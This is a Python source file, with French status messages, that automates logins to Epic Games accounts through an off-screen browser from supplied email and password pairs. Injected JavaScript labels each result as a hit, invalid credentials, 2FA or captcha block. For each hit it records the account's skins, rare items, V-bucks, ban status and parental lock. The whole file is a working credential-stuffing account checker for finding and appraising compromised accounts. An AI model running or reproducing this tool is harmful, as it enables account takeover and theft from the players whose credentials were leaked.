import os
import json
import base64
import asyncio
import zendriver as zd
from typing import Optional, Tuple, Dict
from enum import Enum

from src.logger import logger
from src.api import get_skin_count


class LoginResult(Enum):
    SUCCESS = "success"
    INVALID_CREDS = "invalid_creds"
    TWO_FACTOR = "2fa_required"
    ERROR = "error"
    CAPTCHA = "captcha"


JS_DETECTION_SCRIPT = """
(() => {
    const isElementActive = (el) => {
        if (!el) return false;
        try {
            const s = window.getComputedStyle(el);
            if (s.display === 'none' || s.visibility === 'hidden' || parseFloat(s.opacity) === 0) return false;
            const r = el.getBoundingClientRect();
            return r.width > 0 && r.height > 0;
        } catch(e) {
            return false;
        }
    };

    const url = (window.location.href || "").toLowerCase();
    const body = (document.body ? (document.body.innerText || document.body.textContent || "") : "").toLowerCase();
    const title = (document.title || "").toLowerCase();

    let captcha = false;
    let captchaReason = null;

    const cfKeywords = ["challenges.cloudflare.com", "__cf_chl", "cf-chl-widget"];
    if (cfKeywords.some(k => url.includes(k))) {
        captcha = true;
        captchaReason = "cloudflare_challenge_url";
    }

    const cTitles = ["attention required", "just a moment", "security check", "vérification de sécurité", "human verification", "unusual traffic", "access denied"];
    if (!captcha && cTitles.some(t => title.includes(t))) {
        captcha = true;
        captchaReason = "challenge_title_" + title.substring(0, 30);
    }

    if (!captcha) {
        const captchaSelectors = [
            "iframe#arkose-frame",
            "iframe[src*='arkose']",
            "iframe[src*='arkoselabs']",
            "iframe[src*='funcaptcha']",
            "iframe[src*='challenges.cloudflare.com']",
            "iframe[src*='turnstile']",
            "iframe[src*='hcaptcha']",
            "iframe[src*='recaptcha']",
            "iframe[title*='verification' i]",
            "iframe[title*='challenge' i]",
            "iframe[title*='arkose' i]",
            "iframe[title*='captcha' i]",
            "iframe[title*='security' i]",
            "div#arkose",
            "div#arkose-frame",
            "div#captcha-modal",
            "div.talon_frame",
            "#challenge-stage",
            "#challenge-running",
            "#cf-challenge",
            ".cf-turnstile",
            "#turnstile-wrapper",
            "div[id*='arkose' i]",
            "div[class*='arkose' i]",
            "div[data-testid*='arkose' i]",
            "div[data-testid*='captcha' i]",
            "div[data-testid*='challenge' i]"
        ];

        for (const s of captchaSelectors) {
            try {
                const el = document.querySelector(s);
                if (el) {
                    const style = window.getComputedStyle(el);
                    if (style.display !== 'none' && style.visibility !== 'hidden') {
                        captcha = true;
                        captchaReason = "element_" + s;
                        break;
                    }
                }
            } catch(e) {}
        }
    }

    if (!captcha) {
        try {
            if (window.Arkose || window.myArkose || (window.turnstile && typeof window.turnstile.render === 'function')) {
                const challengeContainer = document.querySelector("#arkose, #challenge-stage, iframe[src*='arkose'], iframe[src*='turnstile']");
                if (challengeContainer) {
                    captcha = true;
                    captchaReason = "js_captcha_object";
                }
            }
        } catch(e) {}
    }

    if (!captcha) {
        const cPhrases = [
            "veuillez résoudre ce défi",
            "résolvez ce puzzle",
            "solve this puzzle",
            "solve the puzzle",
            "security challenge",
            "verify you are human",
            "vérifiez que vous êtes un être humain",
            "vérifiez que vous êtes humain",
            "votre adresse ip a été bloquée",
            "votre ip a été bloquée",
            "ip bloquée",
            "adresse ip bloquée",
            "access denied",
            "access to this page has been denied",
            "unusual traffic",
            "trafic inhabituel",
            "too many requests",
            "trop de requêtes",
            "rate limit",
            "checking if the site connection is secure",
            "please stand by, while we are checking your browser",
            "enable javascript and cookies to continue",
            "vérification de sécurité",
            "vous devez passer un test",
            "epic games accounts - security challenge",
            "temporarily blocked",
            "bloqué temporairement",
            "your ip has been blocked"
        ];
        for (const p of cPhrases) {
            if (body.includes(p)) {
                captcha = true;
                captchaReason = "phrase_" + p;
                break;
            }
        }
    }

    let isOptMfa = url.includes("mfa/add") || url.includes("/id/mfa/add");
    if (!isOptMfa) {
        const skip = Array.from(document.querySelectorAll("button, a")).find(el => {
            if (!isElementActive(el)) return false;
            const t = (el.innerText || el.textContent || "").toLowerCase();
            return ["plus tard", "maybe later", "skip for now", "skip", "pas maintenant", "not now"].some(k => t.includes(k));
        });
        if (skip) isOptMfa = true;
    }

    let isHit = false, hitReason = null;
    if (isOptMfa) {
        isHit = true;
        hitReason = "prompt_mfa_add_optionnelle";
    } else if (url.includes("/account") && !url.includes("/id/login") && !url.includes("/challenge")) {
        isHit = true;
        hitReason = "redirection_compte_reussie";
    } else {
        const hitKws = ["account.epicgames.com", "accounts.epicgames.com", "store.epicgames.com", "/account/personal", "/account/overview", "/launcher/authorized"];
        if (hitKws.some(kw => url.includes(kw)) && !url.includes("/id/login") && !url.includes("/challenge")) {
            isHit = true;
            hitReason = "redirection_compte_reussie";
        } else {
            const userEl = document.querySelector("[data-testid='user-avatar'], [data-testid='user-display-name'], a[href*='/account/personal']");
            if (userEl && isElementActive(userEl)) {
                isHit = true;
                hitReason = "element_compte_connecte";
            }
        }
    }

    let is2fa = false;
    if (!isHit && !isOptMfa && !captcha) {
        const mfaUrls = ["/id/login/mfa", "/id/mfa", "/id/factor", "/id/login/factor", "/id/login/verify", "/id/login/code", "/id/login/two-step"];
        if (mfaUrls.some(kw => url.includes(kw))) {
            is2fa = true;
        } else {
            const mfaSels = ["input#code", "input[name='code']", "input[name='challenge']", "input[data-testid*='code' i]", "input[data-testid*='mfa' i]", "form#mfa-form", "form#challenge-form"];
            for (const s of mfaSels) {
                try {
                    const el = document.querySelector(s);
                    if (el && isElementActive(el)) { is2fa = true; break; }
                } catch(e) {}
            }
            if (!is2fa && (url.includes("/id/login") || url.includes("/mfa"))) {
                const mfaPhrases = ["code de sécurité", "security code", "authentification à deux facteurs", "two-factor authentication", "two-step verification", "entrez le code", "enter the code", "code de vérification", "verification code", "nous avons envoyé un code", "we sent a security code", "we sent a code"];
                if (mfaPhrases.some(p => body.includes(p))) is2fa = true;
            }
        }
    }

    let isBad = false, badReason = null;
    if (!isHit && !is2fa && !captcha) {
        if (["xbox", "login.live.com", "login.microsoftonline.com", "microsoft"].some(kw => url.includes(kw))) {
            isBad = true;
            badReason = "redirection_microsoft_compte_non_lie";
        } else {
            const errPhrases = [
                "invalid credentials", "identifiants invalides", "mot de passe incorrect", "incorrect password",
                "sorry, the credentials you are using are invalid", "désolé, les identifiants que vous utilisez ne sont pas valides",
                "incorrect email or password", "adresse e-mail ou mot de passe incorrect", "no account found",
                "aucun compte trouvé", "compte introuvable", "account not found", "your account is inactive",
                "votre compte est inactif", "compte verrouillé", "trop de tentatives", "too many attempts",
                "user not found", "adresse e-mail invalide", "ce compte n'existe pas", "this account does not exist"
            ];
            for (const p of errPhrases) {
                if (body.includes(p)) { isBad = true; badReason = p; break; }
            }
            if (!isBad) {
                const errSels = ["[data-testid='form-error']", "[data-testid='input-error-password']", "[data-testid='input-error-email']", "p#input-error-password", "#password-error", "[role='alert']"];
                for (const s of errSels) {
                    try {
                        const el = document.querySelector(s);
                        if (el && isElementActive(el)) {
                            const txt = (el.innerText || el.textContent || "").trim().toLowerCase();
                            if (["invalide", "incorrect", "invalid", "introuvable", "inactif", "locked", "no account", "aucun compte", "not found"].some(k => txt.includes(k))) {
                                isBad = true; badReason = txt; break;
                            }
                        }
                    } catch(e) {}
                }
            }
        }
    }

    return {
        isCaptcha: captcha,
        captchaReason: captchaReason,
        isHit: isHit,
        hitReason: hitReason,
        is2fa: is2fa,
        isBad: isBad,
        badReason: badReason,
        url: url
    };
})()
"""

SUBMIT_EMAIL_JS = """
((emailVal) => {
    const inputEl = document.querySelector("input#email, input[type='email'], input[name='email'], input[data-testid*='email' i]");
    if (inputEl) {
        inputEl.focus();
        try {
            const proto = window.HTMLInputElement.prototype;
            const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
            if (setter) setter.call(inputEl, emailVal);
            else inputEl.value = emailVal;
        } catch(e) { inputEl.value = emailVal; }
        if (inputEl._valueTracker) { try { inputEl._valueTracker.setValue(""); } catch(e) {} }
        inputEl.dispatchEvent(new Event('input', { bubbles: true }));
        inputEl.dispatchEvent(new Event('change', { bubbles: true }));
        inputEl.dispatchEvent(new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }));
        inputEl.dispatchEvent(new Event('blur', { bubbles: true }));
    }

    const buttons = Array.from(document.querySelectorAll("button, input[type='submit']")).filter(b => b.offsetParent !== null || b.getBoundingClientRect().width > 0);
    let btn = buttons.find(b => {
        const id = (b.id || "").toLowerCase();
        const testId = (b.getAttribute("data-testid") || "").toLowerCase();
        const txt = (b.innerText || b.textContent || "").trim().toLowerCase();
        return id.includes("continue") || testId.includes("continue") || ["continuer", "continue", "suivant", "next"].some(k => txt.includes(k));
    }) || buttons.find(b => (b.type || "").toLowerCase() === "submit" || (b.id || "").includes("sign-in"));

    if (btn) {
        btn.disabled = false;
        btn.removeAttribute("disabled");
        ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click'].forEach(evt => {
            try { btn.dispatchEvent(new MouseEvent(evt, { bubbles: true, cancelable: true, view: window })); } catch(e) {}
        });
        try { btn.click(); } catch(e) {}
        return true;
    }
    if (inputEl && inputEl.form) {
        try { inputEl.form.requestSubmit(); return true; } catch(e) { try { inputEl.form.submit(); return true; } catch(e2) {} }
    }
    return false;
})
"""

SUBMIT_PASSWORD_JS = """
((pwdVal) => {
    const pwdEl = document.querySelector("input#password, input[type='password'], input[name='password'], input[data-testid*='password' i]");
    if (pwdEl) {
        pwdEl.focus();
        try {
            const proto = window.HTMLInputElement.prototype;
            const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
            if (setter) setter.call(pwdEl, pwdVal);
            else pwdEl.value = pwdVal;
        } catch(e) { pwdEl.value = pwdVal; }
        if (pwdEl._valueTracker) { try { pwdEl._valueTracker.setValue(""); } catch(e) {} }
        pwdEl.dispatchEvent(new Event('input', { bubbles: true }));
        pwdEl.dispatchEvent(new Event('change', { bubbles: true }));
        pwdEl.dispatchEvent(new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }));
        pwdEl.dispatchEvent(new Event('blur', { bubbles: true }));
    }

    const buttons = Array.from(document.querySelectorAll("button, input[type='submit']")).filter(b => b.offsetParent !== null || b.getBoundingClientRect().width > 0);
    let signBtn = buttons.find(b => {
        const id = (b.id || "").toLowerCase();
        const testId = (b.getAttribute("data-testid") || "").toLowerCase();
        const txt = (b.innerText || b.textContent || "").trim().toLowerCase();
        return id.includes("sign-in") || id.includes("signin") || testId.includes("sign-in") || testId.includes("submit") || ["se connecter", "sign in"].some(k => txt.includes(k));
    }) || buttons.find(b => (b.type || "").toLowerCase() === "submit");

    if (signBtn) {
        signBtn.disabled = false;
        signBtn.removeAttribute("disabled");
        ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click'].forEach(evt => {
            try { signBtn.dispatchEvent(new MouseEvent(evt, { bubbles: true, cancelable: true, view: window })); } catch(e) {}
        });
        try { signBtn.click(); } catch(e) {}
        return true;
    }
    if (pwdEl && pwdEl.form) {
        try { pwdEl.form.requestSubmit(); return true; } catch(e) { try { pwdEl.form.submit(); return true; } catch(e2) {} }
    }
    return false;
})
"""


async def capture_screenshot_bytes(page) -> Optional[bytes]:
    screenshot_b64 = await page.screenshot_b64(format="jpeg")
    if screenshot_b64:
        try:
            return base64.b64decode(screenshot_b64)
        except Exception:
            return None
    return None


async def extract_account_details(page) -> Dict:
    parental_pin = "No"
    try:
        parental_link = await page.find("#nav-link-parental-controls", timeout=2)
        if parental_link:
            await parental_link.click()
            await asyncio.sleep(1)
            try:
                await page.find("#parental-controls-challenge-view-title", timeout=1.5)
                parental_pin = "Locked"
            except Exception:
                pass
    except Exception:
        pass

    try:
        (
            skin_count,
            rare_skins,
            vbucks,
            last_match,
            api_success,
            platforms,
            is_banned,
            _,
            ban_reason,
        ) = await get_skin_count(page)
    except Exception:
        (
            skin_count,
            rare_skins,
            vbucks,
            last_match,
            api_success,
            platforms,
            is_banned,
            _,
            ban_reason,
        ) = (0, [], 0, None, False, [], False, "", "")

    screenshot_bytes = await capture_screenshot_bytes(page)
    return {
        "skin_count": skin_count,
        "rare_skins": rare_skins,
        "vbucks": vbucks,
        "last_match": last_match,
        "api_success": api_success,
        "platforms": platforms,
        "is_banned": is_banned,
        "parental_pin": parental_pin,
        "ban_reason": ban_reason,
        "screenshot_bytes": screenshot_bytes,
    }


async def epic_games_login(
    email: str,
    password: str,
    headless: bool = False,
) -> Tuple[LoginResult, Optional[str], Optional[Dict]]:
    browser = None
    try:
        config = zd.Config(
            headless=False,
            browser_args=["--window-position=-2000,-2000", "--window-size=1280,800"],
        )
        browser = await zd.start(config=config)
        page = await browser.get(
            "https://www.epicgames.com/id/login?redirect_uri=https%3A%2F%2Fwww.epicgames.com%2Faccount"
        )

        email_input = None
        for _ in range(35):
            await asyncio.sleep(0.5)
            try:
                await page.evaluate(
                    "(() => {\n                    const cb = Array.from(document.querySelectorAll(\"button, a\")).find(el => {\n                        const t = (el.innerText || el.textContent || '').toLowerCase();\n                        return el.id === 'onetrust-accept-btn-handler' || ['tout accepter', 'accept all', 'accepter'].some(k => t.includes(k));\n                    });\n                    if (cb && (cb.offsetParent !== null || cb.getBoundingClientRect().width > 0)) cb.click();\n                    const sw = Array.from(document.querySelectorAll(\"button, a, [id*='epic-games']\")).find(el => {\n                        const t = (el.innerText || el.textContent || '').toLowerCase();\n                        return ['epic games', 'changer', 'utiliser un autre compte', 'use another account', 'switch account'].some(k => t.includes(k));\n                    });\n                    if (sw && (sw.offsetParent !== null || sw.getBoundingClientRect().width > 0)) sw.click();\n                })()"
                )
            except Exception:
                pass

            result = await page.evaluate(JS_DETECTION_SCRIPT)
            if result.get("isCaptcha"):
                if browser:
                    await browser.stop()
                return (
                    LoginResult.CAPTCHA,
                    f"IP bloquée / Captcha détecté ({result.get('captchaReason')})",
                    None,
                )
            if result.get("isHit"):
                details = await extract_account_details(page)
                if browser:
                    await browser.stop()
                return LoginResult.SUCCESS, result.get("hitReason"), details
            if result.get("is2fa"):
                screenshot_bytes = await capture_screenshot_bytes(page)
                if browser:
                    await browser.stop()
                return (
                    LoginResult.TWO_FACTOR,
                    "Code 2FA requis",
                    {"screenshot_bytes": screenshot_bytes},
                )

            email_input = await page.query_selector(
                'input#email, input[type="email"], input[name="email"], input[data-testid*="email" i]'
            )
            if not email_input:
                continue
            break

        if email_input:
            try:
                await email_input.click()
                await asyncio.sleep(0.15)
                await email_input.clear_input()
                await email_input.send_keys(email)
                await asyncio.sleep(0.2)
            except Exception:
                pass

            await page.evaluate(f"({SUBMIT_EMAIL_JS})({json.dumps(email)})")
            await asyncio.sleep(0.3)
            continue_button = await page.query_selector(
                'button#continue, button[id*="continue"], button[type="submit"]'
            )
            if continue_button:
                await continue_button.click()

            password_reached = False
            for i in range(40):
                await asyncio.sleep(0.5)
                result = await page.evaluate(JS_DETECTION_SCRIPT)
                if result.get("isCaptcha"):
                    if browser:
                        await browser.stop()
                    return (
                        LoginResult.CAPTCHA,
                        f"IP bloquée / Captcha détecté après email ({result.get('captchaReason')})",
                        None,
                    )
                if result.get("isBad"):
                    if browser:
                        await browser.stop()
                    return LoginResult.INVALID_CREDS, result.get("badReason"), None
                if result.get("isHit"):
                    details = await extract_account_details(page)
                    if browser:
                        await browser.stop()
                    return LoginResult.SUCCESS, result.get("hitReason"), details
                if result.get("is2fa"):
                    screenshot_bytes = await capture_screenshot_bytes(page)
                    if browser:
                        await browser.stop()
                    return (
                        LoginResult.TWO_FACTOR,
                        "Code 2FA requis",
                        {"screenshot_bytes": screenshot_bytes},
                    )

                password_screen = await page.evaluate(
                    "(() => {\n                const signBtn = document.querySelector('button#sign-in, button[id*=\"sign-in\"]');\n                const pwdInp = document.querySelector('input#password, input[type=\"password\"]');\n                const contBtn = document.querySelector('button#continue, button[id*=\"continue\"]');\n                const isElVis = (el) => el && (el.offsetParent !== null || el.getBoundingClientRect().width > 0);\n                if (signBtn && isElVis(signBtn)) return true;\n                if (pwdInp && isElVis(pwdInp) && (!contBtn || !isElVis(contBtn))) return true;\n                return false;\n            })()"
                )
                if password_screen:
                    password_reached = True
                    break
                if i % 4 == 0 and i > 0:
                    await page.evaluate(f"({SUBMIT_EMAIL_JS})({json.dumps(email)})")

            if password_reached:
                try:
                    password_input = await page.query_selector(
                        'input#password, input[type="password"]'
                    )
                    if not password_input:
                        password_input = await page.find("input#password")
                    if password_input:
                        try:
                            await password_input.click()
                            await asyncio.sleep(0.15)
                            await password_input.clear_input()
                            await password_input.send_keys(password)
                            await asyncio.sleep(0.2)
                        except Exception:
                            pass
                    await page.evaluate(
                        f"({SUBMIT_PASSWORD_JS})({json.dumps(password)})"
                    )
                    await asyncio.sleep(0.3)
                    sign_in_button = await page.query_selector(
                        'button#sign-in, button[id*="sign-in"], button[type="submit"]'
                    )
                    if sign_in_button:
                        await sign_in_button.click()
                except Exception as e:
                    result = await page.evaluate(JS_DETECTION_SCRIPT)
                    if result.get("isCaptcha"):
                        if browser:
                            await browser.stop()
                        return (
                            LoginResult.CAPTCHA,
                            f"IP bloquée par Epic Games ({result.get('captchaReason')})",
                            None,
                        )
                    if result.get("isBad"):
                        if browser:
                            await browser.stop()
                        return LoginResult.INVALID_CREDS, result.get("badReason"), None
                    if browser:
                        await browser.stop()
                    return LoginResult.ERROR, f"Erreur validation mot de passe ({e})", None

                for i in range(40):
                    await asyncio.sleep(0.5)
                    result = await page.evaluate(JS_DETECTION_SCRIPT)
                    if result.get("isCaptcha"):
                        if browser:
                            await browser.stop()
                        return (
                            LoginResult.CAPTCHA,
                            f"IP bloquée / Captcha détecté après mot de passe ({result.get('captchaReason')})",
                            None,
                        )
                    if result.get("isHit"):
                        details = await extract_account_details(page)
                        if browser:
                            await browser.stop()
                        return LoginResult.SUCCESS, result.get("hitReason"), details
                    if result.get("is2fa"):
                        screenshot_bytes = await capture_screenshot_bytes(page)
                        if browser:
                            await browser.stop()
                        return (
                            LoginResult.TWO_FACTOR,
                            "Code 2FA requis",
                            {"screenshot_bytes": screenshot_bytes},
                        )
                    if result.get("isBad"):
                        if browser:
                            await browser.stop()
                        return LoginResult.INVALID_CREDS, result.get("badReason"), None
                    if i % 6 == 0 and i > 0:
                        await page.evaluate(f"({SUBMIT_PASSWORD_JS})({json.dumps(password)})")

                final_result = await page.evaluate(JS_DETECTION_SCRIPT)
                if final_result.get("isCaptcha"):
                    if browser:
                        await browser.stop()
                    return (
                        LoginResult.CAPTCHA,
                        f"IP bloquée par Epic Games ({final_result.get('captchaReason')})",
                        None,
                    )
                if final_result.get("isHit"):
                    details = await extract_account_details(page)
                    if browser:
                        await browser.stop()
                    return LoginResult.SUCCESS, final_result.get("hitReason"), details
                if final_result.get("is2fa"):
                    screenshot_bytes = await capture_screenshot_bytes(page)
                    if browser:
                        await browser.stop()
                    return (
                        LoginResult.TWO_FACTOR,
                        "Code 2FA requis",
                        {"screenshot_bytes": screenshot_bytes},
                    )
                if final_result.get("isBad"):
                    if browser:
                        await browser.stop()
                    return LoginResult.INVALID_CREDS, final_result.get("badReason"), None

                url = final_result.get("url", "")
                if "/id/login" not in url and not any(
                    k in url for k in ("xbox", "login.live.com", "challenge", "captcha")
                ):
                    details = await extract_account_details(page)
                    if browser:
                        await browser.stop()
                    return LoginResult.SUCCESS, "Redirection réussie hors login", details

                if browser:
                    await browser.stop()
                return LoginResult.ERROR, f"Vérification non concluante ({url})", None
            else:
                result = await page.evaluate(JS_DETECTION_SCRIPT)
                if result.get("isCaptcha"):
                    if browser:
                        await browser.stop()
                    return (
                        LoginResult.CAPTCHA,
                        f"IP bloquée / Captcha après email ({result.get('captchaReason')})",
                        None,
                    )
                if result.get("isBad"):
                    if browser:
                        await browser.stop()
                    return LoginResult.INVALID_CREDS, result.get("badReason"), None
                if browser:
                    await browser.stop()
                return LoginResult.ERROR, "Écran mot de passe non atteint (délai dépassé)", None
        else:
            result = await page.evaluate(JS_DETECTION_SCRIPT)
            if result.get("isCaptcha"):
                if browser:
                    await browser.stop()
                return (
                    LoginResult.CAPTCHA,
                    f"IP bloquée par Epic Games ({result.get('captchaReason')})",
                    None,
                )
            if result.get("isBad"):
                if browser:
                    await browser.stop()
                return LoginResult.INVALID_CREDS, result.get("badReason"), None
            if browser:
                await browser.stop()
            return LoginResult.ERROR, "Page de connexion non chargée (champ email introuvable)", None
    except Exception as e:
        logger.error(f"Erreur de connexion: {e}")
        if browser:
            await browser.stop()
        return LoginResult.ERROR, str(e), None